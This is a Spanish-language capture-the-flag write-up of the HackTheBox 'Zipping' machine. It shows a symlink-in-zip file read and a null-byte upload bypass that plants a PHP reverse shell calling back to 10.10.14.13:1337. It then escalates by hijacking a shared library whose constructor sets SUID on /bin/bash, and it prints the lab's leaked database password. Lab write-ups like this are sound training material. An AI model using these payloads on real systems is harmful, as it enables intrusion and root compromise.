---
title: "Zipping Write-Up - HackTheBox"
description: "Zipping Write-Up - HackTheBox"
pubDatetime: 2023-08-27
tags: ["media", "htb", "season2", "zip", "reversing"]
---

# Reconocimiento

Tenemos la máquina corriendo por la IP _10.10.11.229_. Realizamos un ping para comprobar conectividad.

```bash
❯ ping -c1 10.10.11.229
PING 10.10.11.229 (10.10.11.229) 56(84) bytes of data.
64 bytes from 10.10.11.229: icmp_seq=1 ttl=63 time=124 ms

--- 10.10.11.229 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 123.691/123.691/123.691/0.000 ms
```

Tenemos conectividad. Comenzamos como siempre con un escaneo con `nmap` para encontrar puertos abiertos por TCP y sus respectivos servicios y versiones.

```bash
❯ sudo nmap -sSCV -p- --min-rate 4000 -n -Pn 10.10.11.229
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 03:08 CEST
Nmap scan report for 10.10.11.229
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.80 seconds
```

Tenemos puerto 22 (SSH) y puerto 80 (HTTP) abiertos. No tenemos credenciales para SSH por lo que vamos a por el servicio HTTP.

# Zipping watch store

De primeras tenemos una especie de tienda de relojes.

![](@assets/HackTheBox/Zipping/index.png)

A simple vista tenemos dos funcionalidades interesantes:

- **http://10.10.11.229/shop/** aquí está la tienda. Probando parametros vulnerables a inyección SQL no encuentro nada en un principio, así que paso a la siguiente.

## Subida de archivos

- **http://10.10.11.229/upload.php** aquí tenemos una subida de archivos donde se realizan dos validaciones:

1. Que el archivo sea un `.zip`
2. Que el `.zip` contenga un `.pdf`

Cuando subimos un archivo que cumpla las condiciones, encontramos el archivo en la siguiente ruta:

`http://10.10.11.229/uploads/c5b0c19bcc16a92df48f4b223b4db8c5/test.pdf`

Donde la cadena tras el `/uploads/` es el md5sum del archivo `test.zip` y `test.pdf` el contenido del `.zip`. El archivo se borra tras cierto tiempo.

```bash
❯ md5sum test.zip
c5b0c19bcc16a92df48f4b223b4db8c5  test.zip
```

De primeras se me ocurre buscar vulnerabilidades en subidas de archivos `.zip`.

### Local file inclusion zipeando un link simbólico

Probando las diferentes vías de explotar la subida de archivos encuentro que puedo crear un link simbólico, comprimirlo y subirlo. El servidor al descomprimirlo apuntará a donde apuntó mi link:

```bash
ln -s /etc/passwd exploit.pdf
zip --symlinks exploit.zip exploit.pdf
```

En el navegador no se verá el contenido así que interceptamos la petición con BurpSuite.

![](@assets/HackTheBox/Zipping/etcpasswd.png)

Probé muchas vías pero no logré escalar este LFI.

Lo único interesante que saco es que existe un usuario **rektsu** y unas credenciales para una base de datos mysql (a la que no podemos acceder por que no está expuesta) en el archivo `/var/www/html/shop/functions.php`:

```php
<?php
function pdo_connect_mysql() {
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
    $DATABASE_NAME = 'zipping';
    try {
        return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
    } catch (PDOException $exception) {
        // If there is an error with the connection, stop the script and display the error.
        exit('Failed to connect to database!');
    }
...
```

### Bypasseando la subida de archivos e intrusión al sistema

Probando distintos bypasses añadiendo null bytes por todas partes encuentro una manera.

Primero creamos un archivo `.pdf` y lo zipeamos de la siguiente forma:

```bash
❯ touch cmd.phpA.pdf

❯ echo "<?php system(\"/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.13/1337 0>&1'\")?>" > cmd.phpA.pdf

❯ zip exploit.zip cmd.phpA.pdf
```

La idea es editar el `.zip` en su forma hexadecimal cambiando la **A** (41 en hexadecimal) de `cmd.phpA.pdf` por un null byte (00).

Yo lo haré con neovim pero se puede hacer con cualquier herramienta que te permita editar en forma hexadecimal.

Con neovim es tan fácil como ejecutar `:%!xxd` dentro del editor y editar lo necesario.

![](@assets/HackTheBox/Zipping/vim1.png)

Para revertirlo a su estado original `%!xxd -r`

![](@assets/HackTheBox/Zipping/vim2.png)

Para salir y guardar `:wq`. Una vez hecho esto tenemos el `.zip` malicioso listo.

Nos ponemos en escucha y subimos el archivo.

![](@assets/HackTheBox/Zipping/upload.png)

Accedemos a `http://10.10.11.229/uploads/f506770511a884b9b2816942cdcb40ed/cmd.php` y tenemos shell como **rektsu**

![](@assets/HackTheBox/Zipping/revshell.png)

![](@assets/HackTheBox/Zipping/user.png)

# Escalada de privilegios

Vemos, ejecutando `sudo -l` que podemos ejecutar como cualquier usuario y sin contraseña el binario `/usr/bin/stock`.

Aquí puede haber muchas posibilidades así que antes de lanzarme a analizar el binario con ghidra, probar ataques de buffer overflow, etc.

Vamos a traernos el binario a nuestro equipo local y ver que pasa cuando lo ejecutamos.

## Análisis del binario

Al ejecutar el programa, de primeras nos pide una contraseña.

```bash
❯ ./stock
Enter the password:
```

Ejecutando un `strings` al binario encontramos lo que puede parecer una contraseña.

```bash
❯ strings stock
...
St0ckM4nager
...
```

Tras introducir la contraseña tenemos distintas funciones pero nada interesante de momento.

```bash
❯ ./stock
Enter the password: St0ckM4nager

================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option:
```

Utilizo `uftrace` para ver que corre el programa por detrás sin tener que decompilar todavía.

Por suerte, esto nos arroja algo muy interesante, y es que tras introducir la contraseña el binario requiere una librería de un directorio interesante:

```bash
❯ uftrace --force -a ./stock
Enter the password: St0ckM4nager

================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option:
1
# DURATION     TID     FUNCTIONread the file
 265.920 us [ 99478] | printf("Enter the password: ") = 20;
            [ 99478] | fgets(0x7ffd9e352060, 30, &_IO_2_1_stdin_) {
   1.360  s [ 99478] |   /* linux:schedule */
   1.360  s [ 99478] | } = "St0ckM4nager\n"; /* fgets */
  13.733 us [ 99478] | strchr("St0ckM4nager\n", '\n') = "\n";
   7.087 us [ 99478] | strcmp("St0ckM4nager", "St0ckM4nager") = 0;
 497.441 us [ 99478] | dlopen("/home/rektsu/.config/libcounter.so", RTLD_LAZY) = 0;
...
```

## Creación librería compartida maliciosa

**/home/rektsu/.config/libcounter.so**

Un directorio en una ruta que pertenece al usuario **rektsu**, con el que tenemos shell. Checkeando la ruta de la librería vemos que no existe, así que procedemos a crear uno malicioso.

Primero escribimos el exploit en `C`.

> El `__attribute__((constructor))` al definir la función `exploit()` es necesario porque en C, está construcción se utiliza para indicar que una función debe ejecutarse automáticamente antes de que se ejecute la función `main()`. De lo contrario (lo he probado) no funcionará.

```c
#include <stdio.h>
#include <stdlib.h>
void exploit()__attribute__((constructor));
void exploit()
{
    system("chmod u+s /bin/bash");
}
```

Y lo compilamos como librería compartida con `gcc`.

```bash
gcc -shared -fPIC -o /home/rektsu/.config/libcounter.so exploit.c
```

Corremos el binario, introducimos la contraseña y si todo va bien `/bin/bash` tendrá permisos SUID y podremos obtener una shell como root.

![](@assets/HackTheBox/Zipping/root.png)

# Referencias

- [Zip Based Exploits: Zip Slip and Zip Symlink Upload](https://levelup.gitconnected.com/zip-based-exploits-zip-slip-and-zip-symlink-upload-21afd1da464f)
- [Bypass File Upload Restrictions on Web Apps to Get a Shell ](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/)
- [Linux Shared Library Hijacking](https://xavibel.com/2022/09/06/linux-shared-library-hijacking/)
- [PayloadsAllTheThings - Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#upload-tricks)
